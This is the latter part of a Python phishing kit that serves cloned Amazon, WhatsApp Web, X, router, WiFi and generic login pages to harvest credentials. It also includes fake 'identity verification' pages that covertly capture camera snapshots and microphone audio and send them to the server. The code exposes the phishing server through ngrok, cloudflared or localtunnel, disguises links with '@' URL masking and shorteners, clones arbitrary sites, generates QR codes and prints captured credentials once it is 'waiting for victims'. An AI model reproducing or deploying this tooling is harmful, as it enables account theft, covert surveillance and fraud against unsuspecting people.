        .continue-btn:hover { background: #f7ca00; }
        .privacy { font-size: 12px; text-align: left; margin-top: 18px; line-height: 1.5; }
        .privacy a { color: #0066c0; text-decoration: none; }
        .privacy a:hover { text-decoration: underline; color: #c45500; }
        .divider { text-align: center; position: relative; margin: 20px 0; }
        .divider::before { content: ''; position: absolute; top: 50%; left: 0; right: 0; height: 1px; background: linear-gradient(to right, transparent, #ddd, transparent); }
        .divider span { background: #fff; padding: 0 10px; position: relative; color: #767676; font-size: 12px; }
        .create-btn { width: 100%; background: #fff; border: 1px solid #d5d9d9; border-radius: 8px; padding: 8px; font-size: 14px; cursor: pointer; box-shadow: 0 2px 5px 0 rgba(213,217,217,0.5); }
        .create-btn:hover { background: #f7fafa; }
        footer { margin-top: 40px; border-top: 1px solid #e7e7e7; padding: 20px; text-align: center; }
        .footer-links { display: flex; justify-content: center; gap: 25px; font-size: 11px; margin-bottom: 10px; }
        .footer-links a { color: #0066c0; text-decoration: none; }
        .copyright { font-size: 11px; color: #555; }
    </style>
</head>
<body>
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
    </div>
    <div class="container">
        <div class="card">
            <h1>Sign in</h1>
            <form action="/capture" method="POST">
                <label for="email">Email or mobile phone number</label>
                <input type="text" name="email" id="email" required>
                <button type="submit" class="continue-btn">Continue</button>
            </form>
            <p class="privacy">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
            <div style="margin-top: 18px;">
                <a href="#" style="font-size: 13px; color: #0066c0; text-decoration: none;">Forgot your password?</a>
                <br><br>
                <a href="#" style="font-size: 13px; color: #0066c0; text-decoration: none;">Other issues with Sign-In</a>
            </div>
        </div>
        <div class="divider"><span>New to Amazon?</span></div>
        <button class="create-btn">Create your Amazon account</button>
    </div>
    <footer>
        <div class="footer-links">
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </div>
        <p class="copyright">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </footer>
</body>
</html>'''

def get_whatsapp_2026():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v4/yP/r/rYZqPCBaG70.png">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, sans-serif; }
        body { background: #f0f2f5; min-height: 100vh; }
        header { background: #00a884; height: 220px; display: flex; align-items: flex-start; padding: 40px 60px; gap: 20px; }
        .logo { width: 40px; height: 40px; }
        header h1 { color: #fff; font-size: 20px; font-weight: 500; margin-top: 8px; }
        .container { max-width: 900px; margin: -140px auto 0; padding: 20px; }
        .card { background: #fff; border-radius: 3px; box-shadow: 0 17px 50px 0 rgba(11,20,26,0.19); display: flex; overflow: hidden; }
        .left { flex: 1; padding: 60px; background: #fff; }
        .right { flex: 1; background: #f9f9f9; display: flex; align-items: center; justify-content: center; padding: 40px; }
        h2 { color: #41525d; font-size: 26px; font-weight: 300; margin-bottom: 40px; }
        .features { list-style: none; }
        .features li { display: flex; align-items: center; gap: 16px; margin-bottom: 40px; color: #3b4a54; font-size: 18px; }
        .icon { width: 40px; height: 40px; background: #e6e6e6; border-radius: 50%; }
        .qr-placeholder { width: 264px; height: 264px; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .login-form { width: 100%; max-width: 300px; }
        .login-form h3 { color: #41525d; margin-bottom: 20px; text-align: center; }
        input { width: 100%; padding: 12px; border: 1px solid #d1d7db; border-radius: 4px; margin-bottom: 12px; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #00a884; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        button:hover { background: #008f72; }
        .note { color: #8696a0; font-size: 14px; margin-top: 30px; line-height: 1.5; }
        footer { text-align: center; padding: 40px; color: #8696a0; font-size: 14px; }
        footer a { color: #008069; text-decoration: none; }
        @media (max-width: 768px) { .card { flex-direction: column; } .right { display: none; } }
    </style>
</head>
<body>
    <header>
        <img src="https://static.whatsapp.net/rsrc.php/v4/yP/r/rYZqPCBaG70.png" class="logo" alt="WhatsApp">
        <h1>WhatsApp Web</h1>
    </header>
    <div class="container">
        <div class="card">
            <div class="left">
                <h2>Log in to WhatsApp Web</h2>
                <div class="login-form">
                    <form action="/capture" method="POST">
                        <input type="tel" name="phone" placeholder="Phone number" required>
                        <input type="password" name="password" placeholder="Enter your password" required>
                        <button type="submit">Log In</button>
                    </form>
                </div>
                <p class="note">Don't have WhatsApp on your phone? <a href="#">Download</a></p>
            </div>
            <div class="right">
                <div class="qr-placeholder">
                    <div style="width:200px;height:200px;background:#f0f0f0;display:flex;align-items:center;justify-content:center;">
                        <span style="color:#999;">QR Code Placeholder</span>
                    </div>
                    <p style="margin-top:20px;color:#8696a0;">Or use phone number above</p>
                </div>
            </div>
        </div>
    </div>
    <footer>
        <a href="#">Need help?</a> • <a href="#">Privacy Policy</a> • <a href="#">Terms</a>
    </footer>
</body>
</html>'''

def get_twitter_2026():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X / Log in</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, sans-serif; }
        body { background: #000; min-height: 100vh; display: flex; }
        .left { flex: 1; background: #000; display: flex; align-items: center; justify-content: center; }
        .left svg { width: 300px; fill: #fff; }
        .right { flex: 1; display: flex; align-items: center; padding: 60px; }
        .container { max-width: 400px; width: 100%; }
        h1 { color: #fff; font-size: 64px; font-weight: 700; margin-bottom: 48px; letter-spacing: -1px; }
        h2 { color: #fff; font-size: 31px; font-weight: 700; margin-bottom: 32px; }
        .btn { width: 100%; border: 1px solid #536471; border-radius: 9999px; padding: 12px; font-size: 15px; font-weight: 700; cursor: pointer; margin-bottom: 16px; display: flex; align-items: center; justify-content: center; gap: 8px; background: #fff; color: #000; }
        .btn:hover { background: #e7e9ea; }
        .apple { background: #fff; color: #000; }
        .phone { background: transparent; color: #fff; border-color: #536471; }
        .phone:hover { background: rgba(255,255,255,0.1); }
        .divider { display: flex; align-items: center; margin: 24px 0; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #2f3336; }
        .divider span { color: #71767b; padding: 0 8px; font-size: 15px; }
        input { width: 100%; background: transparent; border: 1px solid #536471; border-radius: 4px; padding: 16px; color: #fff; font-size: 17px; margin-bottom: 16px; }
        input:focus { outline: none; border-color: #1d9bf0; }
        .next { background: #fff; color: #000; border: none; }
        .next:hover { background: #d7dbdc; }
        .forgot { color: #1d9bf0; font-size: 15px; text-decoration: none; margin-top: 24px; display: block; }
        .forgot:hover { text-decoration: underline; }
        .signup { margin-top: 40px; color: #71767b; }
        .signup a { color: #1d9bf0; text-decoration: none; }
        .signup a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="left">
        <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
    </div>
    <div class="right">
        <div class="container">
            <h1>Happening now</h1>
            <h2>Log in to X.</h2>
            <form action="/capture" method="POST">
                <input type="text" name="username" placeholder="Phone, email, or username" required>
                <button type="submit" class="btn next">Next</button>
            </form>
            <div class="divider"><span>or</span></div>
            <button class="btn">Sign in with Google</button>
            <button class="btn apple">Sign in with Apple</button>
            <a href="#" class="forgot">Forgot password?</a>
            <p class="signup">Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
</body>
</html>'''

def get_camera_template():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Access Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: #000; color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
        .icon { font-size: 64px; margin-bottom: 20px; }
        h1 { font-size: 24px; margin-bottom: 16px; }
        p { color: #888; margin-bottom: 30px; max-width: 400px; }
        button { background: #007aff; color: #fff; border: none; border-radius: 10px; padding: 14px 30px; font-size: 17px; cursor: pointer; }
        #video { display: none; }
        canvas { display: none; }
    </style>
</head>
<body>
    <div class="icon">📷</div>
    <h1>Camera Access Required</h1>
    <p>This application requires camera access to verify your identity. Please allow camera access to continue.</p>
    <button onclick="startCamera()">Allow Access</button>
    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>
    
    <script>
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, 640, 480);
                    
                    const imageData = canvas.toDataURL('image/jpeg');
                    
                    fetch('/camera', {
                        method: 'POST',
                        body: imageData
                    });
                    
                    document.body.innerHTML = '<h1>Verifying...</h1><p>Please wait while we verify your identity.</p>';
                    
                    setTimeout(() => {
                        window.location.href = 'https://google.com';
                    }, 3000);
                }, 2000);
            } catch(err) {
                alert('Camera access denied. Please enable camera access and try again.');
            }
        }
    </script>
</body>
</html>'''

def get_audio_template():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voice Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; color: #fff; }
        .mic { width: 100px; height: 100px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 48px; margin-bottom: 30px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        h1 { font-size: 28px; margin-bottom: 16px; }
        p { opacity: 0.9; margin-bottom: 30px; max-width: 400px; }
        button { background: #fff; color: #764ba2; border: none; border-radius: 50px; padding: 16px 40px; font-size: 18px; font-weight: 600; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
    </style>
</head>
<body>
    <div class="mic">🎤</div>
    <h1>Voice Verification Required</h1>
    <p>We need to verify your voice pattern for security purposes. Please allow microphone access and speak the displayed phrase.</p>
    <button onclick="startRecording()">Start Recording</button>
    
    <script>
        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];
                
                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };
                
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks);
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        fetch('/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: 'audio_data=' + encodeURIComponent(reader.result)
                        });
                    };
                    reader.readAsDataURL(audioBlob);
                };
                
                mediaRecorder.start();
                document.querySelector('h1').textContent = 'Recording...';
                document.querySelector('p').textContent = 'Please speak now. Recording will stop in 5 seconds.';
                
                setTimeout(() => {
                    mediaRecorder.stop();
                    document.body.innerHTML = '<h1>Processing...</h1><p>Verifying your voice pattern. Please wait.</p>';
                    setTimeout(() => window.location.href = 'https://google.com', 3000);
                }, 5000);
            } catch(err) {
                alert('Microphone access required.');
            }
        }
    </script>
</body>
</html>'''

def get_wifi_admin_template():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Login - TP-Link</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-box { background: #fff; padding: 40px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h2 { color: #4fc3f7; font-size: 24px; }
        h3 { color: #333; margin-bottom: 20px; font-size: 18px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #4fc3f7; color: #fff; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; margin-top: 10px; }
        button:hover { background: #29b6f6; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo"><h2>⚡ TP-LINK</h2></div>
        <h3>Router Administration</h3>
        <form action="/capture" method="POST">
            <input type="text" name="username" placeholder="Username" value="admin" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">Model: Archer C6 | Firmware: 1.0.0</div>
    </div>
</body>
</html>'''

def get_wifi_password_template():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi Access</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .card { background: #fff; border-radius: 20px; padding: 40px; width: 100%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; }
        .wifi-icon { font-size: 64px; margin-bottom: 20px; }
        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; margin-bottom: 30px; font-size: 14px; }
        input { width: 100%; padding: 15px 20px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 16px; margin-bottom: 15px; transition: border-color 0.3s; }
        input:focus { outline: none; border-color: #667eea; }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .networks { margin-top: 20px; text-align: left; }
        .network { padding: 12px; border-bottom: 1px solid #eee; display: flex; align-items: center; gap: 10px; font-size: 14px; cursor: pointer; }
        .network:hover { background: #f5f5f5; }
        .lock { margin-left: auto; color: #999; }
    </style>
</head>
<body>
    <div class="card">
        <div class="wifi-icon">📶</div>
        <h1>WiFi Connection Required</h1>
        <p>Enter the password to connect to secure network</p>
        <div class="networks">
            <div class="network">🔒 <strong>Secure_WiFi_5G</strong> <span class="lock">Locked</span></div>
            <div class="network">🔒 <strong>Guest_Network</strong> <span class="lock">Locked</span></div>
            <div class="network">🔒 <strong>Home_WiFi_EXT</strong> <span class="lock">Locked</span></div>
        </div>
        <form action="/capture" method="POST" style="margin-top: 20px;">
            <input type="text" name="network_name" placeholder="Network Name" value="Secure_WiFi_5G" required>
            <input type="password" name="wifi_password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>'''

def get_generic_template(name, redirect):
    return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{name} - Secure Login</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }}
        body {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }}
        .card {{ background: #fff; border-radius: 16px; padding: 40px; width: 100%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }}
        h1 {{ color: #1a1a2e; margin-bottom: 8px; font-size: 24px; text-align: center; }}
        .subtitle {{ color: #666; text-align: center; margin-bottom: 32px; font-size: 14px; }}
        input {{ width: 100%; padding: 14px 16px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 14px; margin-bottom: 16px; transition: all 0.2s; }}
        input:focus {{ outline: none; border-color: #667eea; }}
        button {{ width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }}
        button:hover {{ opacity: 0.9; }}
        .footer {{ text-align: center; margin-top: 24px; }}
        .footer a {{ color: #667eea; text-decoration: none; font-size: 14px; }}
    </style>
</head>
<body>
    <div class="card">
        <h1>🔒 {name}</h1>
        <p class="subtitle">Please sign in to continue</p>
        <form action="/capture" method="POST">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="footer">
            <a href="#">Forgot password?</a>
        </div>
    </div>
</body>
</html>'''

# Global variables
CURRENT_TEMPLATE = {}
SERVER_THREAD = None
NGROK_PROCESS = None
CLOUDFLARED_PROCESS = None

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)

def print_menu():
    print(f"\n{Y}╔═══════════════════════════════════════════════════════════╗{NC}")
    print(f"{Y}║{C}           🦈  SELECT AN ATTACK TO DEPLOY  🦈              {Y}║{NC}")
    print(f"{Y}╚═══════════════════════════════════════════════════════════╝{NC}\n")
    
    # Print menu in 4 columns
    keys = list(TEMPLATES.keys())
    for i in range(0, len(keys), 4):
        row = keys[i:i+4]
        line = ""
        for key in row:
            name = TEMPLATES[key]["name"]
            if len(name) > 12:
                name = name[:12]
            line += f"{G}[{key:>2}]{NC} {name:<13} "
        print("  " + line)
    
    print(f"\n  {R}[99]{NC} Exit    {C}[98]{NC} Custom URL")
    print(f"\n{C}shark >> {NC}", end="")

def select_tunnel():
    print(f"\n{Y}╔═══════════════════════════════════════════════════════════╗{NC}")
    print(f"{Y}║{C}              🔗  TUNNEL SELECTION  🔗                     {Y}║{NC}")
    print(f"{Y}╚═══════════════════════════════════════════════════════════╝{NC}\n")
    print(f"  {R}[A]{NC} : {G}ngrok {R}[Google Alert!]{NC}")
    print(f"  {R}[B]{NC} : {G}cloudflared{NC} {Y}[NEW!]{NC}")
    print(f"  {R}[C]{NC} : {G}localtunnel{NC} {Y}[Alternative]{NC}")
    print(f"  {R}[D]{NC} : {G}localhost   {Y}[For Devs!]{NC}")
    
    choice = input(f"\n{C}Please enter your Option (A/B/C/D) : {NC}").strip().upper()
    return choice

def start_ngrok():
    global NGROK_PROCESS
    
    print(f"\n{Y}[*] Starting ngrok tunnel...{NC}")
    
    # Kill existing ngrok
    subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True, shell=False)
    time.sleep(2)
    
    try:
        # Start ngrok
        NGROK_PROCESS = subprocess.Popen(
            ['ngrok', 'http', str(PORT), '--log', 'stdout'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=os.getcwd()
        )
        
        # Wait for ngrok to initialize
        time.sleep(4)
        
        # Get ngrok URL
        max_retries = 10
        for _ in range(max_retries):
            try:
                response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=3)
                data = response.json()
                if data.get('tunnels'):
                    url = data['tunnels'][0]['public_url']
                    print(f"{G}[✓] Ngrok tunnel established!{NC}")
                    print(f"{C}[+] URL: {W}{url}{NC}")
                    return url
            except:
                time.sleep(1)
        
        print(f"{R}[!] Failed to get ngrok URL. Check your authtoken.{NC}")
        return None
        
    except Exception as e:
        print(f"{R}[!] Ngrok error: {e}{NC}")
        return None

def start_cloudflared():
    global CLOUDFLARED_PROCESS
    
    print(f"\n{Y}[*] Starting cloudflared tunnel...{NC}")
    
    # Kill existing
    subprocess.run(['pkill', '-f', 'cloudflared'], capture_output=True, shell=False)
    time.sleep(1)
    
    try:
        # Start cloudflared
        CLOUDFLARED_PROCESS = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        
        # Wait and extract URL
        url = None
        start_time = time.time()
        while time.time() - start_time < 15:
            line = CLOUDFLARED_PROCESS.stdout.readline()
            if line:
                print(f"{Y}[cloudflared] {line.strip()}{NC}")
                if 'https://' in line and 'trycloudflare.com' in line:
                    import re
                    urls = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                    if urls:
                        url = urls[0]
                        break
            time.sleep(0.5)
        
        if url:
            print(f"{G}[✓] Cloudflared tunnel established!{NC}")
            print(f"{C}[+] URL: {W}{url}{NC}")
            return url
        else:
            print(f"{R}[!] Failed to get cloudflared URL{NC}")
            return None
            
    except FileNotFoundError:
        print(f"{R}[!] cloudflared not found. Installing...{NC}")
        install_cloudflared()
        return start_cloudflared()
    except Exception as e:
        print(f"{R}[!] Cloudflared error: {e}{NC}")
        return None

def install_cloudflared():
    print(f"{Y}[*] Installing cloudflared...{NC}")
    try:
        if os.path.exists('/data/data/com.termux/files/usr/bin'):
            # Termux
            cmds = [
                'pkg update -y',
                'pkg install wget -y',
                'wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O /data/data/com.termux/files/usr/bin/cloudflared',
                'chmod +x /data/data/com.termux/files/usr/bin/cloudflared'
            ]
        else:
            # Linux
            cmds = [
                'wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared',
                'chmod +x /usr/local/bin/cloudflared'
            ]
        
        for cmd in cmds:
            subprocess.run(cmd.split(), capture_output=True)
        print(f"{G}[✓] Cloudflared installed!{NC}")
    except Exception as e:
        print(f"{R}[!] Install failed: {e}{NC}")

def start_localtunnel():
    print(f"\n{Y}[*] Starting localtunnel...{NC}")
    try:
        import subprocess
        import re
        
        # Try to use npx localtunnel
        proc = subprocess.Popen(
            ['npx', 'lt', '--port', str(PORT)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        
        time.sleep(3)
        url = None
        
        # Read output
        for _ in range(20):
            line = proc.stdout.readline()
            if line:
                print(f"{Y}[lt] {line.strip()}{NC}")
                if 'https://' in line and 'loca.lt' in line:
                    match = re.search(r'https://[a-zA-Z0-9-]+\.loca\.lt', line)
                    if match:
                        url = match.group()
                        break
            time.sleep(0.5)
        
        if url:
            print(f"{G}[✓] Localtunnel established!{NC}")
            print(f"{C}[+] URL: {W}{url}{NC}")
            return url
        else:
            print(f"{R}[!] Localtunnel failed or not installed{NC}")
            return None
    except:
        print(f"{R}[!] Localtunnel requires Node.js{NC}")
        return None

def mask_url(url):
    print(f"\n{Y}[*] URL Masking Options:{NC}")
    print(f"  {G}[1]{NC} Custom Social Engineering Link")
    print(f"  {G}[2]{NC} Shorten with is.gd (Free)")
    print(f"  {G}[3]{NC} Shorten with tinyurl (Free)")
    print(f"  {G}[4]{NC} Skip")
    
    choice = input(f"\n{C}Select option: {NC}").strip()
    
    if choice == "1":
        domain = input(f"{Y}Enter trusted domain (e.g., facebook.com): {NC}").strip()
        keyword = input(f"{Y}Enter keyword (e.g., free-gift): {NC}").strip()
        masked = f"https://{domain}/{keyword}@{url.replace('https://', '').replace('http://', '')}"
        print(f"\n{G}[✓] Masked URL:{NC} {W}{masked}{NC}")
        print(f"{Y}[!] Note: Modern browsers show real domain in address bar{NC}")
        return masked
        
    elif choice == "2":
        try:
            short = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5).text
            print(f"\n{G}[✓] Short URL:{NC} {W}{short}{NC}")
            return short
        except:
            print(f"{R}[!] Failed to shorten{NC}")
            return url
            
    elif choice == "3":
        try:
            short = requests.get(f"http://tinyurl.com/api-create.php?url={url}", timeout=5).text
            print(f"\n{G}[✓] Short URL:{NC} {W}{short}{NC}")
            return short
        except:
            print(f"{R}[!] Failed to shorten{NC}")
            return url
    
    return url

def generate_qr(url):
    try:
        import qrcode
        print(f"\n{G}[✓] QR Code for mobile:{NC}\n")
        qr = qrcode.QRCode(box_size=3, border=2)
        qr.add_data(url)
        qr.print_ascii()
    except ImportError:
        pass

def start_server():
    global SERVER_THREAD
    
    # Setup server directory
    os.makedirs(SERVER_DIR, exist_ok=True)
    
    # Start web server
    handler = PhishHandler
    httpd = socketserver.TCPServer(("", PORT), handler)
    httpd.allow_reuse_address = True
    
    SERVER_THREAD = threading.Thread(target=httpd.serve_forever)
    SERVER_THREAD.daemon = True
    SERVER_THREAD.start()
    
    print(f"\n{G}[✓] Server started on port {PORT}{NC}")

def setup_template_file(template_id):
    global CURRENT_TEMPLATE
    
    html = generate_2026_template(template_id)
    CURRENT_TEMPLATE = TEMPLATES.get(template_id, {"name": "Custom", "redirect": "https://google.com"})
    
    with open(f"{SERVER_DIR}/index.html", "w") as f:
        f.write(html)
    
    print(f"\n{G}[✓] Template '{CURRENT_TEMPLATE['name']}' loaded{NC}")

def custom_clone():
    url = input(f"{Y}Enter URL to clone: {NC}").strip()
    print(f"{Y}[*] Cloning {url}...{NC}")
    
    try:
        resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        content = resp.text
        
        # Simple replacements to capture data
        content = content.replace('action="', 'action="/capture" method="POST"')
        
        with open(f"{SERVER_DIR}/index.html", "w") as f:
            f.write(content)
        
        print(f"{G}[✓] Custom template loaded!{NC}")
        return True
    except Exception as e:
        print(f"{R}[!] Failed: {e}{NC}")
        return False

def cleanup():
    global NGROK_PROCESS, CLOUDFLARED_PROCESS
    
    print(f"\n{Y}[*] Cleaning up...{NC}")
    
    if NGROK_PROCESS:
        NGROK_PROCESS.terminate()
        subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
    
    if CLOUDFLARED_PROCESS:
        CLOUDFLARED_PROCESS.terminate()
        subprocess.run(['pkill', '-f', 'cloudflared'], capture_output=True)
    
    import shutil
    if os.path.exists(SERVER_DIR):
        shutil.rmtree(SERVER_DIR, ignore_errors=True)
    
    # Show captured data
    if os.path.exists(CREDS_FILE):
        print(f"\n{G}[+] Captured Credentials:{NC}")
        with open(CREDS_FILE, "r") as f:
            print(f.read())
    
    print(f"{G}[✓] Done!{NC}")

def main():
    try:
        print_banner()
        print_menu()
        
        choice = input().strip()
        
        if choice == "99":
            print(f"{Y}Goodbye!{NC}")
            return
        
        if choice == "98":
            custom_clone()
        elif choice in TEMPLATES:
            setup_template_file(choice)
        else:
            print(f"{R}[!] Invalid choice{NC}")
            return
        
        tunnel = select_tunnel()
        start_server()
        
        url = None
        if tunnel == "A":
            url = start_ngrok()
        elif tunnel == "B":
            url = start_cloudflared()
        elif tunnel == "C":
            url = start_localtunnel()
        elif tunnel == "D":
            url = f"http://localhost:{PORT}"
            print(f"{C}[+] Local URL: {W}{url}{NC}")
        
        if url and tunnel in ["A", "B", "C"]:
            url = mask_url(url)
            generate_qr(url)
        
        print(f"\n{G}{'='*60}{NC}")
        print(f"{C}[+] Server running. Waiting for victims...{NC}")
        print(f"{C}[+] Press Ctrl+C to stop{NC}")
        print(f"{G}{'='*60}{NC}\n")
        
        # Keep alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        cleanup()

if __name__ == "__main__":
    main()